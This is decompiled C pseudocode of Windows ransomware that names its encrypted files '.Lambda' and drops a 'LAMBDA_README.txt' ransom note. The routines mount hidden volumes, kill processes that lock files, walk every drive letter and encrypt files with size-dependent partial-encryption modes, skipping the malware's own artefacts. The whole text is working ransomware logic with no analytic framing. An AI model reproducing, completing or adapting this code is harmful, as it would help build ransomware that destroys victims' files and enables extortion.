char __thiscall sub_40A1B0(const WCHAR *this)
{
  DWORD v1; // ebx
  SIZE_T v2; // ebx
  WCHAR *v3; // esi
  UINT DriveTypeW; // eax
  WCHAR *v5; // ebx
  HANDLE FileW; // eax
  int dwBytes; // [esp+Ch] [ebp-14h]
  WCHAR *i; // [esp+14h] [ebp-Ch]
  DWORD cchBufferLength; // [esp+18h] [ebp-8h] BYREF
  char v12; // [esp+1Fh] [ebp-1h]

  v1 = 260;
  cchBufferLength = 260;
  v12 = 1;
  while ( 1 )
  {
    v2 = 2 * v1;
    v3 = (WCHAR *)HeapAlloc(hHeap, 8u, v2);
    for ( i = v3; !v3; i = v3 )
    {
      Sleep(0x64u);
      v3 = (WCHAR *)HeapAlloc(hHeap, 8u, v2);
    }
    if ( GetVolumePathNamesForVolumeNameW(this, v3, cchBufferLength, &cchBufferLength) )
      break;
    if ( GetLastError() != 234 )
      goto LABEL_18;
    HeapFree(hHeap, 0, v3);
    v1 = cchBufferLength;
  }
  if ( *v3 )
  {
LABEL_18:
    v12 = 1;
    goto LABEL_19;
  }
  if ( cchBufferLength == 1 )
  {
    DriveTypeW = GetDriveTypeW(this);
    if ( DriveTypeW == 2 || DriveTypeW == 3 )
    {
      dwBytes = 2 * lstrlenW(this) + 16;
      v5 = (WCHAR *)HeapAlloc(hHeap, 8u, dwBytes);
      if ( !v5 )
      {
        do
        {
          Sleep(0x64u);
          v5 = (WCHAR *)HeapAlloc(hHeap, 8u, dwBytes);
        }
        while ( !v5 );
        v3 = i;
      }
      lstrcpyW(v5, this);
      lstrcatW(v5, L"bootmgr");
      FileW = CreateFileW(v5, 0x80000000, 3u, 0, 3u, 0x80u, 0);
      if ( FileW == (HANDLE)-1 )
        v12 = 0;
      else
        CloseHandle(FileW);
      HeapFree(hHeap, 0, v5);
    }
  }
LABEL_19:
  HeapFree(hHeap, 0, v3);
  return v12;
}
// 40A315: conditional instruction was optimized away because esi.4!=0

//----- (0040A330) --------------------------------------------------------
void sub_40A330()
{
  int v0; // esi
  int v1; // edi
  HANDLE v2; // ebx
  HANDLE v3; // eax
  HANDLE FirstVolumeW; // ebx
  const WCHAR *v5; // edi
  void *v6; // [esp-Ch] [ebp-2FCh]
  WCHAR szVolumeName[258]; // [esp+10h] [ebp-2E0h] BYREF
  LPCWSTR lpszVolumeMountPoint[27]; // [esp+214h] [ebp-DCh]
  LPVOID lpParameter[26]; // [esp+280h] [ebp-70h]
  DWORD ExitCode; // [esp+2E8h] [ebp-8h] BYREF
  void *Thread; // [esp+2ECh] [ebp-4h] BYREF

  if ( !Parameter && dword_430908 )
  {
    v0 = 0;
    lpParameter[0] = L"A:\\";
    lpParameter[1] = L"B:\\";
    v1 = 0;
    lpParameter[2] = L"C:\\";
    lpParameter[3] = L"D:\\";
    lpParameter[4] = L"E:\\";
    lpParameter[5] = L"F:\\";
    lpParameter[6] = L"G:\\";
    lpParameter[7] = L"H:\\";
    lpParameter[8] = L"I:\\";
    lpParameter[9] = L"J:\\";
    lpParameter[10] = L"K:\\";
    lpParameter[11] = L"L:\\";
    lpParameter[12] = L"M:\\";
    lpParameter[13] = L"N:\\";
    lpParameter[14] = L"O:\\";
    lpParameter[15] = L"P:\\";
    lpParameter[16] = L"Q:\\";
    lpParameter[17] = L"R:\\";
    lpParameter[18] = L"S:\\";
    lpParameter[19] = L"T:\\";
    lpParameter[20] = L"U:\\";
    lpParameter[21] = L"V:\\";
    lpParameter[22] = L"W:\\";
    lpParameter[23] = L"X:\\";
    lpParameter[24] = L"Y:\\";
    lpParameter[25] = L"Z:\\";
    do
    {
      v2 = DuplicateTokenHandle;
      v6 = lpParameter[v1];
      ExitCode = 0;
      v3 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetDriveTypeW, v6, 4u, 0);
      Thread = v3;
      if ( v3 )
      {
        if ( dword_4309DC && v2 )
        {
          SetThreadToken(&Thread, v2);
          v3 = Thread;
        }
        ResumeThread(v3);
        WaitForSingleObject(Thread, 0xFFFFFFFF);
        GetExitCodeThread(Thread, &ExitCode);
        CloseHandle(Thread);
      }
      if ( ExitCode == 1 )
        lpszVolumeMountPoint[++v0] = (LPCWSTR)lpParameter[v1];
      ++v1;
    }
    while ( v1 < 26 );
    FirstVolumeW = FindFirstVolumeW(szVolumeName, 0x104u);
    if ( FirstVolumeW != (HANDLE)-1 )
    {
      do
      {
        if ( szVolumeName[0] == 92
          && szVolumeName[1] == 92
          && szVolumeName[2] == 63
          && szVolumeName[3] == 92
          && !sub_40A1B0(szVolumeName) )
        {
          if ( !v0 )
            break;
          v5 = lpszVolumeMountPoint[v0--];
          if ( SetVolumeMountPointW(v5, szVolumeName) )
            sub_408990((int)L"Mounted %s as %s", (int)szVolumeName);
        }
      }
      while ( FindNextVolumeW(FirstVolumeW, szVolumeName, 0x104u) );
      FindVolumeClose(FirstVolumeW);
    }
  }
}
// 42B4A4: using guessed type wchar_t aA[4];
// 42B4AC: using guessed type wchar_t aB[4];
// 42B4B4: using guessed type wchar_t aC[4];
// 42B4BC: using guessed type wchar_t aD[4];
// 42B4C4: using guessed type wchar_t aE[4];
// 42B4CC: using guessed type wchar_t asc_42B4CC[4];
// 42B4D4: using guessed type wchar_t aG[4];
// 42B4DC: using guessed type wchar_t asc_42B4DC[4];
// 42B4E4: using guessed type wchar_t aI[4];
// 42B4EC: using guessed type wchar_t aJ[4];
// 42B4F4: using guessed type wchar_t aK[4];
// 42B4FC: using guessed type wchar_t asc_42B4FC[4];
// 42B504: using guessed type wchar_t aM[4];
// 42B50C: using guessed type wchar_t aN[4];
// 42B514: using guessed type wchar_t aO[4];
// 42B51C: using guessed type wchar_t aP[4];
// 42B524: using guessed type wchar_t aQ[4];
// 42B52C: using guessed type wchar_t aR[4];
// 42B534: using guessed type wchar_t aS[4];
// 42B53C: using guessed type wchar_t aT[4];
// 42B544: using guessed type wchar_t aU[4];
// 42B54C: using guessed type wchar_t aV[4];
// 42B554: using guessed type wchar_t aW[4];
// 42B55C: using guessed type wchar_t asc_42B55C[4];
// 42B564: using guessed type wchar_t aY[4];
// 42B56C: using guessed type wchar_t aZ[4];
// 42B574: using guessed type wchar_t aMountedSAsS[17];
// 430908: using guessed type int dword_430908;
// 4309DC: using guessed type int dword_4309DC;

//----- (0040A560) --------------------------------------------------------
char __thiscall sub_40A560(LPCWSTR lpString1)
{
  const WCHAR *v2; // esi

  if ( lstrcmpiW(lpString1, L"LAMBDA_README.txt")
    && lstrcmpiW(lpString1, L"LPW11.tmp")
    && lstrcmpiW(lpString1, L"LambdaDebug.txt")
    && lstrcmpiW(lpString1, L"LLTKTPR.bmp")
    && lstrcmpiW(lpString1, L"BTC.ico") )
  {
    v2 = lpString2;
    if ( !*lpString2 )
      return 0;
    while ( lstrcmpiW(lpString1, v2) )
    {
      v2 += lstrlenW(v2) + 1;
      if ( !*v2 )
        return 0;
    }
  }
  return 1;
}

//----- (0040A5E0) --------------------------------------------------------
BOOL __thiscall sub_40A5E0(LPCWSTR lpString)
{
  SIZE_T v1; // ebx
  WCHAR *i; // esi
  HANDLE FileW; // edi
  int v4; // eax
  LPCWSTR lpString2; // [esp+Ch] [ebp-4h] BYREF

  lpString2 = lpString;
  v1 = 2 * lstrlenW(lpString) + 128;
  for ( i = (WCHAR *)HeapAlloc(hHeap, 8u, v1); !i; i = (WCHAR *)HeapAlloc(hHeap, 8u, v1) )
    Sleep(0x64u);
  lstrcpyW(i, lpString2);
  lstrcatW(i, L"LAMBDA_README.txt");
  FileW = CreateFileW(i, 0x40000000u, 0, 0, 1u, 0x80u, 0);
  if ( FileW != (HANDLE)-1 )
  {
    v4 = lstrlenA(pBuf);
    WriteFile(FileW, pBuf, v4, (LPDWORD)&lpString2, 0);
    CloseHandle(FileW);
  }
  return HeapFree(hHeap, 0, i);
}

//----- (0040A6B0) --------------------------------------------------------
char __thiscall sub_40A6B0(const WCHAR *this)
{
  char v1; // bl
  SIZE_T v2; // esi
  RM_PROCESS_INFO *v3; // ecx
  DWORD CurrentProcessId; // eax
  UINT v5; // ecx
  unsigned int v6; // esi
  int v7; // edx
  char *v8; // ebx
  DWORD v9; // eax
  int v10; // edx
  const WCHAR *v11; // esi
  char v12; // bl
  HANDLE v13; // eax
  void *v14; // esi
  WCHAR v16[34]; // [esp+4h] [ebp-6Ch] BYREF
  LPCWSTR rgsFileNames; // [esp+48h] [ebp-28h] BYREF
  char *v18; // [esp+4Ch] [ebp-24h]
  unsigned int v19; // [esp+50h] [ebp-20h]
  DWORD dwRebootReasons; // [esp+54h] [ebp-1Ch] BYREF
  LPVOID lpMem; // [esp+58h] [ebp-18h]
  int v22; // [esp+5Ch] [ebp-14h]
  UINT pnProcInfoNeeded; // [esp+60h] [ebp-10h] BYREF
  DWORD pSessionHandle; // [esp+64h] [ebp-Ch] BYREF
  UINT pnProcInfo; // [esp+68h] [ebp-8h] BYREF
  char v26; // [esp+6Fh] [ebp-1h]

  rgsFileNames = this;
  pSessionHandle = 0;
  v1 = 0;
  dwRebootReasons = 0;
  pnProcInfoNeeded = 0;
  pnProcInfo = 0;
  v26 = 0;
  if ( !RmStartSession(&pSessionHandle, 0, v16) )
  {
    if ( !RmRegisterResources(pSessionHandle, 1u, &rgsFileNames, 0, 0, 0, 0)
      && RmGetList(pSessionHandle, &pnProcInfoNeeded, &pnProcInfo, 0, &dwRebootReasons) == 234 )
    {
      v2 = 668 * pnProcInfoNeeded;
      v3 = (RM_PROCESS_INFO *)HeapAlloc(hHeap, 8u, 668 * pnProcInfoNeeded);
      for ( lpMem = v3; !v3; lpMem = v3 )
      {
        Sleep(0x64u);
        v3 = (RM_PROCESS_INFO *)HeapAlloc(hHeap, 8u, v2);
      }
      pnProcInfo = pnProcInfoNeeded;
      if ( !RmGetList(pSessionHandle, &pnProcInfoNeeded, &pnProcInfo, v3, &dwRebootReasons) )
      {
        CurrentProcessId = GetCurrentProcessId();
        v5 = pnProcInfo;
        v6 = 0;
        v19 = 0;
        v7 = CurrentProcessId;
        v22 = CurrentProcessId;
        if ( pnProcInfo )
        {
          v8 = (char *)lpMem;
          v18 = (char *)lpMem;
          do
          {
            v9 = *(_DWORD *)v8;
            if ( *(_DWORD *)v8 != v7 && v9 != 4 )
            {
              v10 = *((_DWORD *)v8 + 163);
              if ( v10 != 4 && v10 != 1000 )
              {
                v11 = pszSrch;
                if ( *pszSrch )
                {
                  while ( !StrStrIW((PCWSTR)v8 + 6, v11) )
                  {
                    v11 += lstrlenW(v11) + 1;
                    if ( !*v11 )
                    {
                      v9 = *(_DWORD *)v8;
                      goto LABEL_17;
                    }
                  }
                }
                else
                {
LABEL_17:
                  v12 = 0;
                  v13 = OpenProcess(0x100001u, 0, v9);
                  v14 = v13;
                  if ( v13 )
                  {
                    if ( TerminateProcess(v13, 0) )
                      v12 = WaitForSingleObject(v14, 0x4E20u) == 0;
                    CloseHandle(v14);
                  }
                  v26 += v12;
                  v8 = v18;
                }
                v5 = pnProcInfo;
                v6 = v19;
              }
              v7 = v22;
            }
            ++v6;
            v8 += 668;
            v19 = v6;
            v18 = v8;
          }
          while ( v6 < v5 );
        }
      }
      HeapFree(hHeap, 0, lpMem);
      v1 = v26;
    }
    RmEndSession(pSessionHandle);
  }
  return v1;
}
// 40A6B0: using guessed type WCHAR var_6C[34];

//----- (0040A8B0 - ENCRYPT FILE) --------------------------------------------------------
char __fastcall sub_40A8B0(const WCHAR *pObjectName, const void *a2)  
{
  WCHAR *v2; // ebx
  int v3; // edi
  HANDLE FileW; // esi
  HANDLE v5; // eax
  void *v6; // esi
  int v7; // eax
  SIZE_T v8; // edi
  WCHAR *v9; // esi
  WCHAR *v10; // eax
  void (__stdcall *v11)(LPWSTR, LPCWSTR); // edi
  ULONG v12; // eax
  unsigned int i; // edi
  unsigned int v15; // esi
  char *v17; // ecx
  bool v18; // zf
  BOOL v19; // eax
  HANDLE v20; // ebx
  DWORD LowPart; // edi
  char *j; // ebx
  LONG HighPart; // ecx
  int v24; // eax
  __int64 v25; // rax
  LPWSTR v26; // eax
  const WCHAR *v27; // esi
  const WCHAR *v28; // edi
  LPWSTR ExtensionW; // eax
  const WCHAR *v30; // esi
  const WCHAR *v31; // edi
  __m128i *v32; // esi
  int v33; // edx
  int v34; // eax
  __m128i *v35; // eax
  int v36; // ecx
  int v37; // ecx
  unsigned __int8 *v38; // eax
  HANDLE v39; // esi
  signed __int64 v40; // rax
  union _LARGE_INTEGER v41; // kr08_8
  int v42; // esi
  BOOL (__stdcall *v43)(HANDLE, DWORD, LPVOID); // edi
  char Buffer[536]; // [esp+10h] [ebp-438h] BYREF
  unsigned __int8 v45[44]; // [esp+228h] [ebp-220h] BYREF
  int v46; // [esp+254h] [ebp-1F4h]
  WCHAR String2[128]; // [esp+260h] [ebp-1E8h] BYREF
  WCHAR String[64]; // [esp+360h] [ebp-E8h] BYREF
  __m128i v49[2]; // [esp+3E0h] [ebp-68h] BYREF
  unsigned __int8 v50[32]; // [esp+400h] [ebp-48h] BYREF
  DWORD NumberOfBytesRead; // [esp+420h] [ebp-28h] BYREF
  const void *QuadPart_high; // [esp+424h] [ebp-24h]
  union _LARGE_INTEGER FileSize; // [esp+428h] [ebp-20h] BYREF
  BOOL (__stdcall *v54)(HANDLE); // [esp+430h] [ebp-18h]
  LPCWSTR pszPath; // [esp+434h] [ebp-14h]
  LPWSTR lpString1; // [esp+438h] [ebp-10h]
  HANDLE FileHandle; // [esp+43Ch] [ebp-Ch]
  BOOL (__stdcall *v58)(HANDLE, DWORD, LPVOID); // [esp+440h] [ebp-8h]
  char v59; // [esp+446h] [ebp-2h]
  char v60; // [esp+447h] [ebp-1h]

  v2 = (WCHAR *)pObjectName;
  QuadPart_high = a2;
  v3 = 0;
  pszPath = pObjectName;
  v60 = 0;
  FileHandle = 0;
  v58 = 0;
  SetFileAttributesW(pObjectName, 0x80u);
  FileW = CreateFileW(v2, 0xC0000000, 0, 0, 3u, 0, 0);
  if ( FileW != (HANDLE)-1 )
  {
LABEL_9:
    v59 = 1;
    v54 = CloseHandle;
    CloseHandle(FileW);
    v58 = 0;
    SetFileAttributesW(v2, 0x80u);
    v5 = CreateFileW(v2, 0x80000000, 0, 0, 3u, 0, 0);
    v6 = v5;
    if ( v5 != (HANDLE)-1 )
    {
      if ( SetFilePointerEx(v5, (LARGE_INTEGER)-592i64, 0, 2u) && ReadFile(v6, Buffer, 0x250u, &NumberOfBytesRead, 0) )
      {
        v7 = sub_405450(v45);
        v58 = (BOOL (__stdcall *)(HANDLE, DWORD, LPVOID))(v7 == v46);
      }
      CloseHandle(v6);
    }
    if ( !(_BYTE)v58 )
    {
      v8 = 2 * lstrlenW(v2) + 128;
      v9 = (WCHAR *)HeapAlloc(hHeap, 8u, v8);
      lpString1 = v9;
      if ( !v9 )
      {
        do
        {
          Sleep(0x64u);
          v10 = (WCHAR *)HeapAlloc(hHeap, 8u, v8);
          lpString1 = v10;
        }
        while ( !v10 );
        v2 = (WCHAR *)pszPath;
        v9 = v10;
      }
      v11 = (void (__stdcall *)(LPWSTR, LPCWSTR))lstrcatW;
      while ( 1 )
      {
        if ( dword_4308F0 )
        {
          v12 = Seed;
          if ( !Seed && byte_43083F != (_BYTE)Seed )
          {
            __asm { rdseed  ecx }
            if ( (unsigned __int8)byte_43083F >= (unsigned __int8)Seed )
              v12 = 563;
            Seed = v12;
          }
          qmemcpy(String, L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", 0x7Eu);
          for ( i = 0; i < 9; ++i )
          {
            v15 = lstrlenW(String) - 1;
            String2[i] = String[RtlRandomEx(&Seed) % v15];
          }
          v9 = lpString1;
          String2[9] = 0;
          lstrcpyW(lpString1, v2);
          PathRemoveFileSpecW(v9);
          v11 = (void (__stdcall *)(LPWSTR, LPCWSTR))lstrcatW;
          lstrcatW(v9, L"\\");
          lstrcatW(v9, String2);
          lstrcatW(v9, L".Lambda");
        }
        else
        {
          lstrcpyW(v9, v2);
          v17 = (char *)FileHandle + 1;
          v18 = FileHandle == 0;
          FileHandle = (char *)FileHandle + 1;
          if ( v18 )
            wsprintfW(String2, L".Lambda");
          else
            wsprintfW(String2, L"%lu.Lambda", v17);
          v11(v9, String2);
        }
        v19 = MoveFileExW(v2, v9, 8u);
        v58 = HeapFree;
        if ( v19 )
          break;
        if ( GetLastError() != 183 )
        {
          GetLastError();
          sub_408990((int)L"Unable To Rename File: %s - %lu", (int)v2);
          goto LABEL_88;
        }
      }
      v20 = CreateFileW(v9, 0xC0000000, 0, 0, 3u, 0x48000000u, 0);
      FileHandle = v20;
      if ( v20 != (HANDLE)-1 )
      {
        if ( GetFileSizeEx(v20, &FileSize) && (LowPart = FileSize.LowPart, FileSize.QuadPart) )
        {
          if ( FileSize.QuadPart >= 0x100000 )
            LowPart = 0x100000;
          for ( j = (char *)HeapAlloc(hHeap, 8u, LowPart + 1248); !j; j = (char *)HeapAlloc(hHeap, 8u, LowPart + 1248) )
            Sleep(0x64u);
          *((_DWORD *)j + 151) = FileHandle;
          *((_DWORD *)j + 306) = LowPart;
          HighPart = FileSize.HighPart;
          *((_DWORD *)j + 308) = FileSize.LowPart;
          v24 = dword_43093C;
          *((_DWORD *)j + 309) = HighPart;
          switch ( v24 )
          {
            case 0:
              goto LABEL_75;
            case 1:
              v25 = dword_4309D4 << 20;
              *((_DWORD *)j + 156) = 1;
              *((_QWORD *)j + 77) = v25;
              goto LABEL_60;
            case 2:
              goto LABEL_59;
            case 3:
              ExtensionW = PathFindExtensionW(pszPath);
              if ( !*ExtensionW )
                goto LABEL_59;
              v30 = dword_4309E4;
              if ( !*dword_4309E4 )
                goto LABEL_59;
              v31 = ExtensionW + 1;
              while ( lstrcmpiW(v31, v30) )
              {
                v30 += lstrlenW(v30) + 1;
                if ( !*v30 )
                {
LABEL_59:
                  *((_DWORD *)j + 156) = 2;
                  goto LABEL_60;
                }
              }
              if ( FileSize.HighPart > 0 )
                goto LABEL_79;
              if ( FileSize.QuadPart > 0x2000000 )
              {
                if ( FileSize.HighPart >= 0 && FileSize.LowPart > 0x20000000 )
                {
LABEL_79:
                  if ( FileSize.QuadPart > 0x200000000i64 )
                  {
                    if ( FileSize.QuadPart > 0x2000000000i64 )
                    {
                      if ( FileSize.QuadPart > 0x20000000000i64 )
                      {
                        *((_DWORD *)j + 156) = 1;
                        *((_DWORD *)j + 154) = 0;
                        *((_DWORD *)j + 155) = 4;
                      }
                      else
                      {
                        *((_DWORD *)j + 156) = 1;
                        *((_DWORD *)j + 154) = 0x40000000;
                        *((_DWORD *)j + 155) = 0;
                      }
                    }
                    else
                    {
                      *((_DWORD *)j + 156) = 1;
                      *((_DWORD *)j + 154) = 0x4000000;
                      *((_DWORD *)j + 155) = 0;
                    }
                  }
                  else
                  {
                    *((_DWORD *)j + 156) = 1;
                    *((_DWORD *)j + 154) = 0x400000;
                    *((_DWORD *)j + 155) = 0;
                  }
                }
                else
                {
                  *((_DWORD *)j + 156) = 1;
                  *((_DWORD *)j + 154) = 0x40000;
                  *((_DWORD *)j + 155) = 0;
                }
              }
              else
              {
LABEL_75:
                *((_DWORD *)j + 156) = 0;
              }
              goto LABEL_60;
            case 4:
              v26 = PathFindExtensionW(pszPath);
              if ( !*v26 )
                goto LABEL_52;
              v27 = dword_4309E4;
              if ( !*dword_4309E4 )
                goto LABEL_52;
              v28 = v26 + 1;
              break;
            default:
              goto LABEL_60;
          }
          while ( lstrcmpiW(v28, v27) )
          {
            v27 += lstrlenW(v27) + 1;
            if ( !*v27 )
            {
LABEL_52:
              *((_QWORD *)j + 77) = dword_4309D4 << 20;
              *((_DWORD *)j + 156) = 1;
              goto LABEL_60;
            }
          }
          *((_DWORD *)j + 156) = 0;
LABEL_60:
          sub_40A060((UCHAR *)v49, 0x20u);
          sub_40A060((UCHAR *)j + 1200, 8u);
          sub_4087B0(v49, (int)(j + 1168), (unsigned __int8 *)L"\t");
          sub_4087B0(v49, (int)v50, byte_430918);
          sub_410250((char *)v50, v50);
          sub_401F30(v50, (_DWORD *)j + 6, (unsigned __int8 *)j + 1200);
          v32 = (__m128i *)(j + 632);
          v33 = *((_DWORD *)j + 155);
          *((_DWORD *)j + 158) = *((_DWORD *)j + 156);
          *((_DWORD *)j + 160) = *((_DWORD *)j + 154);
          *((_DWORD *)j + 161) = v33;
          *((_DWORD *)j + 302) = sub_405450(v50);
          v34 = sub_405450((unsigned __int8 *)j + 1168);
          v18 = dword_4308F0 == 0;
          *((_DWORD *)j + 303) = v34;
          if ( !v18 )
          {
            qmemcpy(j + 648, QuadPart_high, 0x208u);
            v32 = (__m128i *)(j + 632);
          }
          sub_402100(v32, (__m128i *)(j + 24), v32, 0x218u);
          v35 = v49;
          v36 = 32;
          do
          {
            v35->m128i_i8[0] = 0;
            v35 = (__m128i *)((char *)v35 + 1);
            --v36;
          }
          while ( v36 );
          v37 = 32;
          v38 = v50;
          do
          {
            *v38++ = 0;
            --v37;
          }
          while ( v37 );
          v39 = FileHandle;
          if ( !CreateIoCompletionPort(FileHandle, CompletionPort, 0, 0)
            || !PostQueuedCompletionStatus(CompletionPort, 0, 0, (LPOVERLAPPED)j) )
          {
            v54(v39);
            v43 = v58;
            v58(hHeap, 0, j);
            v43(hHeap, 0, lpString1);
            return v60;
          }
          _InterlockedIncrement(&dword_430A18);
          if ( dword_4308D4 )
          {
            v41 = FileSize;
            QuadPart_high = (const void *)HIDWORD(v41.QuadPart);
            LODWORD(v40) = v41.QuadPart;
            FileHandle = (HANDLE)FileSize.LowPart;
            v54 = (BOOL (__stdcall *)(HANDLE))&qword_430A20;
            do
            {
              do
              {
                pszPath = (LPCWSTR)HIDWORD(qword_430A20);
                v42 = qword_430A20;
                v40 = _InterlockedCompareExchange64(
                        (volatile signed __int64 *)v54,
                        __PAIR64__((unsigned int)QuadPart_high, v40) + qword_430A20,
                        qword_430A20);
                v18 = (_DWORD)v40 == v42;
                LODWORD(v40) = FileHandle;
              }
              while ( !v18 );
            }
            while ( (LPCWSTR)HIDWORD(v40) != pszPath );
          }
          v9 = lpString1;
          v60 = 1;
        }
        else
        {
          v54(v20);
        }
      }
LABEL_88:
      v58(hHeap, 0, v9);
    }
    return v60;
  }
  while ( GetLastError() == 32 )
  {
    if ( v58 == (BOOL (__stdcall *)(HANDLE, DWORD, LPVOID))1 )
    {
      sub_408990((int)L"Unable To Access File: %s - SHARING_VIOLATION", (int)v2);
      goto LABEL_30;
    }
    sub_40A6B0(v2);
    v58 = (BOOL (__stdcall *)(HANDLE, DWORD, LPVOID))1;
LABEL_8:
    SetFileAttributesW(v2, 0x80u);
    FileW = CreateFileW(v2, 0xC0000000, 0, 0, 3u, 0, 0);
    if ( FileW != (HANDLE)-1 )
      goto LABEL_9;
  }
  if ( GetLastError() != 5 )
    goto LABEL_30;
  if ( v3 != 1 )
  {
    sub_40FB80(v2);
    v3 = 1;
    goto LABEL_8;
  }
  sub_408990((int)L"Unable To Access File: %s - ACCESS_DENIED", (int)v2);
LABEL_30:
  v59 = 0;
  return v60;
}
// 40AF42: conditional instruction was optimized away because %FileSize@4.4==0
// 40A986: conditional instruction was optimized away because %var_2.1==1
// 40AB3D: conditional instruction was optimized away because esi.4==FFFFFFFF
// 42AAA0: using guessed type wchar_t aAbcdefghijklmn[63];
// 42B628: using guessed type wchar_t aUnableToAccess[46];
// 42B688: using guessed type wchar_t aUnableToAccess_0[42];
// 42B708: using guessed type wchar_t aUnableToRename[32];
// 42B8AC: using guessed type wchar_t asc_42B8AC[2];
// 43083F: using guessed type char byte_43083F;
// 4308D4: using guessed type int dword_4308D4;
// 4308F0: using guessed type int dword_4308F0;
// 430918: using guessed type unsigned __int8 byte_430918[32];
// 43093C: using guessed type int dword_43093C;
// 4309D4: using guessed type int dword_4309D4;
// 430A18: using guessed type int dword_430A18;
// 430A20: using guessed type __int64 qword_430A20;
// 40A8B0: using guessed type char Buffer[536];
// 40A8B0: using guessed type unsigned __int8 var_220[44];
// 40A8B0: using guessed type WCHAR String[64];
// 40A8B0: using guessed type __m128i var_68[2];

//----- (0040B070) --------------------------------------------------------
ULONG __stdcall StartAddress(const WCHAR *Parameter)
{
  WCHAR *v1; // esi
  HANDLE CurrentThread; // eax
  int (__stdcall *v3)(LPCWSTR); // edi
  SIZE_T v4; // esi
  int *v5; // esi
  int *v6; // eax
  WCHAR *v7; // esi
  const WCHAR *v8; // esi
  int v9; // esi
  SIZE_T v10; // esi
  WCHAR *i; // edi
  int **v12; // eax
  LPWSTR ExtensionW; // eax
  const WCHAR *v14; // edi
  const WCHAR *v15; // esi
  int v16; // esi
  SIZE_T v17; // edi
  WCHAR *j; // esi
  _DWORD *v19; // eax
  int v20; // ecx
  HANDLE v22; // [esp-Ch] [ebp-284h]
  void *v23; // [esp-4h] [ebp-27Ch]
  const WCHAR *lpString; // [esp+10h] [ebp-268h]
  int *v25; // [esp+14h] [ebp-264h] BYREF
  int **v26; // [esp+18h] [ebp-260h]
  LPVOID lpMem; // [esp+1Ch] [ebp-25Ch]
  int v28; // [esp+20h] [ebp-258h]
  HANDLE hFindFile; // [esp+24h] [ebp-254h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+28h] [ebp-250h] BYREF

  v1 = (WCHAR *)Parameter;
  if ( (GetFileAttributesW(Parameter) & 0x10) == 0 )
    goto LABEL_43;
  CurrentThread = GetCurrentThread();
  SetThreadPriority(CurrentThread, 2);
  v28 = dword_4308D0;
  v26 = &v25;
  v25 = (int *)&v25;
  sub_408990((int)L"Start Enumeration: %s", (int)Parameter);
  v3 = lstrlenW;
  while ( 2 )
  {
    v4 = 2 * v3(v1) + 16;
    for ( lpMem = HeapAlloc(hHeap, 8u, v4); !lpMem; lpMem = HeapAlloc(hHeap, 8u, v4) )
      Sleep(0x64u);
    v5 = (int *)lpMem;
    lstrcpyW((LPWSTR)lpMem + 4, Parameter);
    v6 = v25;
    *v5 = (int)v25;
    v5[1] = (int)&v25;
    v6[1] = (int)v5;
    v25 = v5;
    if ( v5 == (int *)&v25 )
      goto LABEL_40;
    do
    {
      v7 = (WCHAR *)(v5 + 2);
      lpString = v7;
      sub_40A5E0(v7);
      lstrcatW(v7, L"*");
      hFindFile = FindFirstFileW(v7, &FindFileData);
      if ( hFindFile == (HANDLE)-1 )
        goto LABEL_39;
      *wcsrchr(v7, 0x2Au) = 0;
      do
      {
        if ( !lstrcmpiW(FindFileData.cFileName, L".")
          || !lstrcmpiW(FindFileData.cFileName, L"..")
          || (FindFileData.dwFileAttributes & 0x404) != 0 )
        {
          goto LABEL_37;
        }
        if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
        {
          if ( !dword_430938 || (FindFileData.dwFileAttributes & 2) == 0 )
          {
            v8 = ::lpMem;
            if ( *::lpMem )
            {
              while ( lstrcmpiW(FindFileData.cFileName, v8) )
              {
                v8 += v3(v8) + 1;
                if ( !*v8 )
                  goto LABEL_17;
              }
            }
            else
            {
LABEL_17:
              v9 = v3(lpString);
              v10 = 2 * (v9 + v3(FindFileData.cFileName)) + 18;
              for ( i = (WCHAR *)HeapAlloc(hHeap, 8u, v10); !i; i = (WCHAR *)HeapAlloc(hHeap, 8u, v10) )
                Sleep(0x64u);
              lstrcpyW(i + 4, lpString);
              lstrcatW(i + 4, FindFileData.cFileName);
              lstrcatW(i + 4, L"\\");
              v12 = v26;
              *(_DWORD *)i = &v25;
              *((_DWORD *)i + 1) = v12;
              *v12 = (int *)i;
              v26 = (int **)i;
            }
          }
        }
        else
        {
          if ( sub_40A560(FindFileData.cFileName) )
            goto LABEL_37;
          ExtensionW = PathFindExtensionW(FindFileData.cFileName);
          if ( !*ExtensionW )
            goto LABEL_27;
          v14 = ExtensionW + 1;
          if ( !lstrcmpiW(ExtensionW + 1, L"Lambda") )
            goto LABEL_37;
          v15 = dword_430914;
          if ( !*dword_430914 )
          {
LABEL_26:
            v7 = (WCHAR *)lpString;
            v3 = lstrlenW;
LABEL_27:
            if ( (FindFileData.nFileSizeLow || FindFileData.nFileSizeHigh)
              && (!v28 || FindFileData.nFileSizeHigh || FindFileData.nFileSizeLow > 0xA00000) )
            {
              v16 = v3(v7);
              v17 = 2 * (v16 + v3(FindFileData.cFileName)) + 2;
              for ( j = (WCHAR *)HeapAlloc(hHeap, 8u, v17); !j; j = (WCHAR *)HeapAlloc(hHeap, 8u, v17) )
                Sleep(0x64u);
              lstrcpyW(j, lpString);
              lstrcatW(j, FindFileData.cFileName);
              sub_40FB80(j);
              if ( !sub_40A8B0(j, FindFileData.cFileName) )
                _InterlockedIncrement(&dword_430A1C);
              HeapFree(hHeap, 0, j);
            }
            goto LABEL_37;
          }
          while ( lstrcmpiW(v14, v15) )
          {
            v15 += lstrlenW(v15) + 1;
            if ( !*v15 )
              goto LABEL_26;
          }
        }
LABEL_37:
        v3 = lstrlenW;
        v7 = (WCHAR *)lpString;
      }
      while ( FindNextFileW(hFindFile, &FindFileData) );
      FindClose(hFindFile);
LABEL_39:
      v23 = lpMem;
      v22 = hHeap;
      v19 = (_DWORD *)*((_DWORD *)lpMem + 1);
      v20 = *(_DWORD *)lpMem;
      *v19 = *(_DWORD *)lpMem;
      *(_DWORD *)(v20 + 4) = v19;
      HeapFree(v22, 0, v23);
      v5 = v25;
      lpMem = v25;
    }
    while ( v25 != (int *)&v25 );
LABEL_40:
    v1 = (WCHAR *)Parameter;
    if ( v28 )
    {
      sub_408990((int)L"Finished Exploring Large Files on: %s", (int)Parameter);
      v28 = 0;
      continue;
    }
    break;
  }
  sub_408990((int)L"Finished Exploring All Files on: %s", (int)Parameter);
LABEL_43:
  HeapFree(hHeap, 0, v1);
  return 0;
}
// 42B748: using guessed type wchar_t aStartEnumerati[22];
